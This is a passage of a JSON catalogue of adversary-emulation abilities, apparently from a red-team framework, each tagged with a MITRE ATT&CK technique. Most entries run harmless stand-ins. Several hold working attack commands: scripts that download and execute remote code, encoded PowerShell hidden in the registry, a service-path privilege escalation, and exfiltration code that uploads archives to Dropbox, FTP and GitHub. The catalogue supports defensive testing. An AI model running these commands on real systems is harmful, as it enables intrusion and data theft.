\"=WAIT(NOW()+`\"00:00:05`\")\"; $sheet.Cells.Item(22,1) = \"=EXEC(`\"explorer.exe C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A2&`\"`\")\"; $sheet.Cells.Item(23,1) = \"=HALT()\"; $sheet.Cells.Item(1,1).Name = \"runme\"; $xlApp.Run(\"runme\"); $xlApp.Quit(); [System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) | Out-Null; [System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null; [System.GC]::Collect(); [System.GC]::WaitForPendingFinalizers(); Remove-Variable xlBook; Remove-Variable xlApp", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "User Execution: Malicious File", "ability_id": "623806a6fd4d832b6692eb275535f636", "technique_id": "T1204.002", "tactic": "execution", "requirements": [], "name": "Excel 4 Macro", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Attackers who have permissions, can run malicious commands in containers in the cluster using exec command (\u201ckubectl exec\u201d). In this method, attackers can use legitimate images, such as an OS image (e.g., Ubuntu) as a backdoor container, and run their malicious code remotely by using \u201ckubectl exec\u201d.\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["kubectl delete pod busybox -n default"], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "kubectl create -f $PathtoAtomicsFolder/T1609/src/busybox.yaml -n default; sleep 3; kubectl exec -n default busybox -- uname", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Kubernetes Exec Into Container", "ability_id": "43f573167a6260250bab539a9fd5de68", "technique_id": "T1609", "tactic": "execution", "requirements": [], "name": "ExecIntoContainer", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Utilize PowerShell to echo a command to clipboard and execute it\n", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "echo Get-Process | clip; Get-Clipboard | iex", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Clipboard Data", "ability_id": "8c0f619c7dfd33907bf20b1dfb58022b", "technique_id": "T1115", "tactic": "collection", "requirements": [], "name": "Execute Commands from Clipboard using PowerShell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes LNK file document.lnk from AllTheThings.iso. Link file executes cmd.exe and rundll32 to in order to load and execute AllTheThingsx64.dll from the ISO which spawns calc.exe.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["053c10_AllTheThings.iso", "053c10_AllTheThings.iso"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Dismount-DiskImage -ImagePath \"053c10_AllTheThings.iso\" | Out-Null"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Mount-DiskImage -ImagePath \"053c10_AllTheThings.iso\" -StorageType ISO -Access ReadOnly; $keep = Get-Volume -FileSystemLabel \"AllTheThings\"; $driveLetter = ($keep | Get-Volume).DriveLetter; $instance = [activator]::CreateInstance([type]::GetTypeFromCLSID(\"{c08afd90-f2a1-11d1-8455-00a0c91f3880}\")); $instance.Document.Application.ShellExecute($driveLetter+\":\\document.lnk\",\"\",$driveLetter+\":\\\",$null,0)", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Subvert Trust Controls: Mark-of-the-Web Bypass", "ability_id": "0b3e89fa4ed4a3eabadd330b44c3ec3d", "technique_id": "T1553.005", "tactic": "defense-evasion", "requirements": [], "name": "Execute LNK file from ISO", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "When the word document opens it will prompt the user to click ok on a dialogue box, then attempt to run PowerShell with DDEAUTO to download and execute a powershell script\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["0a4081_DDE_Document.docx"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "start 0a4081_DDE_Document.docx", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Inter-Process Communication: Dynamic Data Exchange", "ability_id": "e401dd1a8de06f4a52b66736c2050bb7", "technique_id": "T1559.002", "tactic": "execution", "requirements": [], "name": "Execute PowerShell script via Word DDE", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Create Python file (.py) then compile to binary (.pyc) that downloads an external malicious script then executes locally using the supplied executor and arguments\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "which_python=$(which python || which python3 || which python2); echo 'import requests' >; echo 'import os' >>; echo 'url = \"#{script_url}\"' >>; echo 'malicious_command = \"#{executor} #{payload_file_name} #{script_args}\"' >>; echo 'session = requests.session()' >>; echo 'source = session.get(url).content' >>; echo 'fd = open(\"#{payload_file_name}\", \"wb+\")' >>; echo 'fd.write(source)' >>; echo 'fd.close()' >>; echo 'os.system(malicious_command)' >>; $which_python -c 'import py_compile; py_compile.compile(\"#{python_script_name}\", \"#{python_binary_name}\")'; $which_python", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: Python", "ability_id": "b3ea15867906316fd87a4f320a9403d3", "technique_id": "T1059.006", "tactic": "execution", "requirements": [], "name": "Execute Python via Python executables (Linux)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Create Python file (.py) that downloads and executes shell script via executor arguments", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "which_python=$(which python || which python3 || which python2); echo 'import requests' >; echo 'import os' >>; echo 'url = \"#{script_url}\"' >>; echo 'malicious_command = \"#{executor} #{payload_file_name} #{script_args}\"' >>; echo 'session = requests.session()' >>; echo 'source = session.get(url).content' >>; echo 'fd = open(\"#{payload_file_name}\", \"wb+\")' >>; echo 'fd.write(source)' >>; echo 'fd.close()' >>; echo 'os.system(malicious_command)' >>; $which_python", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: Python", "ability_id": "85758c8aa8c05f1b82e74e02ca26a97a", "technique_id": "T1059.006", "tactic": "execution", "requirements": [], "name": "Execute Python via scripts (Linux)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Creates a service specifying an arbitrary command and executes it. When executing commands such as PowerShell, the service will report that it did not start correctly even when code executes properly.\n\nUpon successful execution, cmd.exe creates a new service using sc.exe that will start powershell.exe to create a new file `art-marker.txt`\n\n[BlackCat Ransomware (ALPHV)](https://www.varonis.com/blog/blackcat-ransomware)  \n[Cybereason vs. BlackCat Ransomware](https://www.cybereason.com/blog/cybereason-vs.-blackcat-ransomware)\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del C:\\art-marker.txt >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "sc.exe create ARTService binPath= \"%COMSPEC% /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\\art-marker.txt\" && sc.exe start ARTService && sc.exe delete ARTService", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "System Services: Service Execution", "ability_id": "a0eddf3ba6bede6cf017eb99ee1cefd8", "technique_id": "T1569.002", "tactic": "execution", "requirements": [], "name": "Execute a Command as a Service", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Create and execute a process from a directory masquerading as the current parent directory (`...` instead of normal `..`)\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -f $HOME/.../sh; rmdir $HOME/.../"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "mkdir $HOME/...; cp $(which sh) $HOME/...; $HOME/.../sh -c \"echo Hello from the Atomic Red Team test T1036.005#1\"", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -f $HOME/.../sh; rmdir $HOME/.../"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "mkdir $HOME/...; cp $(which sh) $HOME/...; $HOME/.../sh -c \"echo Hello from the Atomic Red Team test T1036.005#1\"", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Masquerading: Match Legitimate Name or Location", "ability_id": "23dafb943f2f1a3e21e8204826c7b271", "technique_id": "T1036.005", "tactic": "defense-evasion", "requirements": [], "name": "Execute a process from a directory masquerading as the current parent directory.", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Creates base64-encoded PowerShell code and executes it. This is used by numerous adversaries and malicious tools.\n\nUpon successful execution, powershell will execute an encoded command and stdout default is \"Write-Host \"Hey, Atomic!\"\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$OriginalCommand = 'Write-Host \"Hey, Atomic!\"'; $Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand); $EncodedCommand =[Convert]::ToBase64String($Bytes); $EncodedCommand; powershell.exe -EncodedCommand $EncodedCommand", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Obfuscated Files or Information", "ability_id": "b62952c5352ee68c1340feb08a5a02a1", "technique_id": "T1027", "tactic": "defense-evasion", "requirements": [], "name": "Execute base64-encoded PowerShell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Stores base64-encoded PowerShell code in the Windows Registry and deobfuscates it for execution. This is used by numerous adversaries and malicious tools.\n\nUpon successful execution, powershell will execute encoded command and read/write from the registry.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-ItemProperty -Force -ErrorAction Ignore -Path HKCU:Software\\Microsoft\\Windows\\CurrentVersion -Name Debug"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$OriginalCommand = 'Write-Host \"Hey, Atomic!\"'; $Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand); $EncodedCommand =[Convert]::ToBase64String($Bytes); $EncodedCommand; Set-ItemProperty -Force -Path HKCU:Software\\Microsoft\\Windows\\CurrentVersion -Name Debug -Value $EncodedCommand; powershell.exe -Command \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:Software\\Microsoft\\Windows\\CurrentVersion Debug).Debug)))\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Obfuscated Files or Information", "ability_id": "89a4fca013d3d39fc4effb1f6c8a8d74", "technique_id": "T1027", "tactic": "defense-evasion", "requirements": [], "name": "Execute base64-encoded PowerShell from Windows Registry", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes a command, writing the output to a local Admin Share.\nThis technique is used by post-exploitation frameworks.\n", "repeatable": false, "privilege": "", "buckets": ["lateral-movement"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "cmd.exe /Q /c hostname 1> \\\\127.0.0.1\\ADMIN$\\output.txt 2>&1", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Remote Services: SMB/Windows Admin Shares", "ability_id": "5c2ddc375b4963647ac9c913641ab6d6", "technique_id": "T1021.002", "tactic": "lateral-movement", "requirements": [], "name": "Execute command writing output to local Admin Share", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Echo a command to clipboard and execute it", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "echo ifconfig | pbcopy; $(pbpaste)", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Clipboard Data", "ability_id": "760ad6f5fe8880dae1044a384c514ccd", "technique_id": "T1115", "tactic": "collection", "requirements": [], "name": "Execute commands from clipboard", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Download and execute shell script and write to file then execute locally using Python -c (command mode)", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "which_python=$(which python || which python3 || which python2); $which_python -c 'import requests;import os;url = \"#{script_url}\";malicious_command = \"#{executor} #{payload_file_name} #{script_args}\";session = requests.session();source = session.get(url).content;fd = open(\"#{payload_file_name}\", \"wb+\");fd.write(source);fd.close();os.system(malicious_command)'", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: Python", "ability_id": "5e85bef7dcda5706a9948bea69e09ade", "technique_id": "T1059.006", "tactic": "execution", "requirements": [], "name": "Execute shell script via python's command mode arguement", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Mimic execution of compressed executable. When successfully executed, calculator.exe will open.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["taskkill /f /im calculator.exe >nul 2>nul && rmdir /S /Q %temp%\\temp_T1027.zip >nul 2>nul && del /Q \"%temp%\\T1027.zip\" >nul 2>nul"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "\"%temp%\\temp_T1027.zip\\T1027.exe\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Obfuscated Files or Information", "ability_id": "fcbaf10bb84ae47998ae094c053bdef8", "technique_id": "T1027", "tactic": "defense-evasion", "requirements": [], "name": "Execution from Compressed File", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "IcedID uses this TTP as follows:\n  rundll32.exe url.dll,OpenURL %PUBLIC%\\index.hta\nTrickbot uses this TTP as follows:\n  rundll32.exe URL.dll,FileProtocolHandler C:\\\\..\\\\Detail\\\\akteullen.vbs\n\nIn this atomic, the sample hta file opens the calculator and the vbs file shows a message dialog with \"rundll32 spawned wscript\"\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["631d9f_index.hta"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "rundll32.exe url.dll,OpenURL 631d9f_index.hta && rundll32.exe URL.dll,FileProtocolHandler PathToAtomicsFolder\\T1218.011\\src\\akteullen.vbs", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Rundll32", "ability_id": "e30d392a79640eb86ee5fedd78416a33", "technique_id": "T1218.011", "tactic": "defense-evasion", "requirements": [], "name": "Execution of HTA and VBS Files using Rundll32 and URL.dll", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Rundll32.exe running non-dll \n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "rundll32.exe C:\\Users\\$env:username\\Downloads\\calc.png, StartW", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Rundll32", "ability_id": "16e96b0f0c0021663b2f5dfafabee6f0", "technique_id": "T1218.011", "tactic": "defense-evasion", "requirements": [], "name": "Execution of non-dll using rundll32.exe", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "When a service is created whose executable path contains spaces and isn\u2019t enclosed within quotes, leads to a vulnerability\nknown as Unquoted Service Path which allows a user to gain SYSTEM privileges.\nIn this case, if an executable program.exe in C:\\ exists, C:\\program.exe will be executed instead of test.exe in C:\\Program Files\\subfolder\\test.exe.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["0655d1_WindowsServiceExample.exe"], "parsers": [], "cleanup": ["sc stop \"Example Service\" >nul 2>&1 && sc delete \"Example Service\" >nul 2>&1 && del \"C:\\Program Files\\windows_service.exe\" >nul 2>&1 && del \"C:\\program.exe\" >nul 2>&1 && del \"C:\\Time.log\" >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "copy 0655d1_WindowsServiceExample.exe \"C:\\Program Files\\windows_service.exe\" && copy 0655d1_WindowsServiceExample.exe \"C:\\program.exe\" && sc create \"Example Service\" binpath= \"C:\\Program Files\\windows_service.exe\" Displayname= \"Example Service\" start= auto && sc start \"Example Service\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Hijack Execution Flow: Path Interception by Unquoted Path", "ability_id": "60a4a8dcf702a076bbf4e04d3a049263", "technique_id": "T1574.009", "tactic": "multiple", "requirements": [], "name": "Execution of program.exe as service with unquoted service path", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Execute program by leveraging Win32 API's. By default, this will launch calc.exe from the command prompt.", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["7175f8_CreateProcess.cs"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:\"%tmp%\\T1106.exe\" /target:exe 7175f8_CreateProcess.cs && %tmp%/T1106.exe", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Native API", "ability_id": "43f1775664b60cdf31c1b9ea0d7dd8a7", "technique_id": "T1106", "tactic": "execution", "requirements": [], "name": "Execution through API - CreateProcess", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This will exfiltrate an archive to Dropbox.", "repeatable": false, "privilege": "", "buckets": ["exfiltration"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$SourceFile = (Get-Item #{host.dir.compress});\n$RemoteName = \"$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($SourceFile.name)\";\n$TargetFilePath = \"/#{dropbox.target.dir}/$RemoteName\";\n$ApiKey = \"#{dropbox.api.key}\";\n\n$url = \"https://content.dropboxapi.com/2/files/upload\";\n\n$file = [IO.File]::ReadAllBytes($SourceFile);\n[net.httpWebRequest] $req = [net.webRequest]::create($url);\n\n$arg = '{ \"path\": \"' + $TargetFilePath + '\", \"mode\": \"add\", \"autorename\": true, \"mute\": false }';\n$authorization = \"Bearer \" + $ApiKey;\n\n$req.method = \"POST\";\n$req.Headers.Add(\"Authorization\", $authorization);\n$req.Headers.Add(\"Dropbox-API-Arg\", $arg);\n$req.ContentType = 'application/octet-stream';\n$req.ContentLength = $file.length;\n$req.TimeOut = 50000;\n$req.KeepAlive = $true;\n$req.Headers.Add(\"Keep-Alive: 300\");\n$reqst = $req.getRequestStream();\n$reqst.write($file, 0, $file.length);\n$reqst.flush();\n$reqst.close();\n\n[net.httpWebResponse] $res = $req.getResponse();\n$resst = $res.getResponseStream();\n$sr = new-object IO.StreamReader($resst);\n$result = $sr.ReadToEnd();\n$result;\n$res.close();", "language": null, "name": "psh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.acrn", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "exfil.done"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "LocalFile='#{host.dir.compress}';\nRemoteName=\"$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)\";\ncurl -X POST https://content.dropboxapi.com/2/files/upload\n    --header \"Authorization: Bearer #{dropbox.api.key}\"\n    --header \"Dropbox-API-Arg: {\\\"path\\\": \\\"/#{dropbox.target.dir}/$RemoteName\\\",\\\"mode\\\": \\\"add\\\",\\\"autorename\\\": true,\\\"mute\\\": false,\\\"strict_conflict\\\": false}\"\n    --header \"Content-Type: application/octet-stream\"\n    --data-binary @#{host.dir.compress}", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Exfiltration to Cloud Storage", "ability_id": "3ce95a28-25fc-4a7e-a0cd-0fdb190e2081", "technique_id": "T1567.002", "tactic": "exfiltration", "requirements": [{"relationship_match": [{"source": "host.dir.compress"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Exfil Compressed Archive to Dropbox", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This ability exfiltrates a compressed archive to an FTP server.", "repeatable": false, "privilege": "", "buckets": ["exfiltration"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.acrn", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "exfil.done"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "LocalFile='#{host.dir.compress}';\nRemoteName=\"$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)\";\ncurl -T #{host.dir.compress} ftp://#{ftp.server.address}/$RemoteName --user #{ftp.user.name}:'#{ftp.user.password}'", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$SourceFile = (Get-Item #{host.dir.compress});\n$RemoteName = \"$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($SourceFile.name)\";\n$ftp = [System.Net.FtpWebRequest]::Create(\"ftp://#{ftp.server.address}/$RemoteName\");\n$ftp = [System.Net.FTPWebRequest]$ftp;\n$ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile;\n$ftp.Credentials = New-Object System.Net.NetworkCredential(\"#{ftp.user.name}\", \"#{ftp.user.password}\");\n$ftp.UseBinary = $true;\n$ftp.UsePassive = $true;\n\n$content = [System.IO.File]::ReadAllBytes(\"#{host.dir.compress}\");\n$ftp.ContentLength = $content.Length;\n$requestStream = $ftp.GetRequestStream();\n$requestStream.Write($content, 0, $content.Length);\n\n$requestStream.Close();\n$requestStream.Dispose();", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol", "ability_id": "d754878c-17dd-46dc-891c-a993f8a10336", "technique_id": "T1048.003", "tactic": "exfiltration", "requirements": [{"relationship_match": [{"source": "host.dir.compress"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Exfil Compressed Archive to FTP Server", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This ability exfiltrates a compressed archive to Github Gists (Base64 Encoded). To reconstitute, save\nthe base64 string from the Gist and run ----\n(Powershell) [Convert]::FromBase64String($(Get-Content b64.txt)) | set-content archive.extension -encoding byte ----\n(Linux) cat b64.txt | base64 -d > archive.extension\n", "repeatable": false, "privilege": "", "buckets": ["exfiltration"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.acrn", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "exfil.done"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "GHUser=\"#{github.user.name}\";\nGHPAT=\"#{github.access.token}\";\nFileContent=$(base64 #{host.dir.compress});\nLocalFile='#{host.dir.compress}';\nRemoteFile=\"$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)\";\ntmp_file=$(mktemp);\necho \"{\\\"public\\\": false,\\\"files\\\": {\\\"$RemoteFile\\\": {\\\"content\\\": \\\"${FileContent}\\\"}}}\" > $tmp_file;\ncurl --silent --output /dev/null --show-error --fail -X POST -d @$tmp_file -u $GHUser:$GHPAT https://api.github.com/gists;\nrm $tmp_file", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$GHUser = \"#{github.user.name}\";\n$GHPAT = \"#{github.access.token}\";\n$File = Get-Item -Path \"#{host.dir.compress}\";\n$Token = $GHUser + \":\" + $GHPAT;\n$EncodedToken = [System.Convert]::ToBase64String([char[]]$Token);\n\n$RemoteName = \"$(Get-Date -Format yyyymmddhhmmss)-exfil-paw-$($File.name)\";\n$FileContent = [Convert]::ToBase64String([IO.File]::ReadAllBytes($File));\n\n$StringContent = @{\n    files = @{$RemoteName = @{content = $FileContent}};\n    public = $False;\n} | ConvertTo-Json;\n$URL = \"https://api.github.com/gists\";\n$Body = $StringContent;\n$Headers = @{\n    \"content-type\" = \"application/json\";\n    \"Authorization\" = 'Basic {0}' -f $EncodedToken;\n};\nInvoke-WebRequest -Uri $URL -Method POST -Body $Body -Headers $Headers 1>$null -UseBasicParsing;", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Exfiltration to Code Repository", "ability_id": "0582dc26-e0cf-4645-88cf-f37a02279976", "technique_id": "T1567.001", "tactic": "exfiltration", "requirements": [{"relationship_match": [{"source": "host.dir.compress"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Exfil Compressed Archive to Github Gist", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This will exfiltrate a given compressed directory to a GitHub repository. It assumes that all the facts supplied are valid.", "repeatable": false, "privilege": "", "buckets": ["exfiltration"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.acrn", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "exfil.done"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "GHUser=\"#{github.user.name}\";\nGHRepo=\"#{github.repository.name}\";\nGHPAT=\"#{github.access.token}\";\nGHBranch='#{github.repository.branch}';\nLocalFile='#{host.dir.compress}';\nHeader=\"Authorization: token $GHPAT\";\nRemoteName=\"$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)\";\necho \"{\\\"message\\\":\\\"Committed $RemoteName\\\", \\\"branch\\\":\\\"$GHBranch\\\", \\\"content\\\":\\\"\" >/tmp/b64;\nbase64 -w 0 $LocalFile >>/tmp/b64;\necho \"\\\"}\" >>/tmp/b64;\ncontent=$(curl -s -X PUT -H \"Accept: application/vnd.github.v3+json\" -H \"$Header\" https://api.github.com/repos/$GHUser/$GHRepo/contents/$RemoteName -d @/tmp/b64);\nrm /tmp/b64;", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$GHUser = \"#{github.user.name}\";\n$GHRepo = \"#{github.repository.name}\";\n$GHPAT = \"#{github.access.token}\";\n$GHBranch = '#{github.repository.branch}';\n$token = $GHUser + \":\" + $GHPAT;\n$basetoken = [System.Convert]::ToBase64String([char[]]$token);\n$Headers = @{\n    Authorization = 'Basic {0}' -f $basetoken;\n};\n$file = (Get-Item #{host.dir.compress});\n$RemoteName = \"$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($file.name)\";\n$uri = \"https://api.github.com/repos/\" + $GHUser + \"/\" + $GHRepo + \"/contents/\" + $RemoteName;\n\n$FileBytes = Get-Content -Path $file.FullName -Encoding Byte;\n$Base64EncodedFileBytes = [System.Convert]::ToBase64String($FileBytes);\n$Body = @{\n    path = $RemoteName;\n    branch = $GHBranch;\n    content = $Base64EncodedFileBytes;\n    encoding = 'base64';\n    message = \"Committed \" + $RemoteName;\n} | ConvertTo-Json;\ntry {\n  $content = Invoke-RestMethod -Headers $Headers -Uri $uri -Body $Body -Method Put -ErrorAction SilentlyContinue;\n} catch {\n  if ($PSItem -notmatch \"but expected\") { $PSItem; }\n}", "language": null, "name": "psh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$GHUser = \"#{github.user.name}\";\n$GHRepo = \"#{github.repository.name}\";\n$GHPAT = \"#{github.access.token}\";\n$GHBranch = '#{github.repository.branch}';\n$token = $GHUser + \":\" + $GHPAT;\n$basetoken = [System.Convert]::ToBase64String([char[]]$token);\n$Headers = @{\n    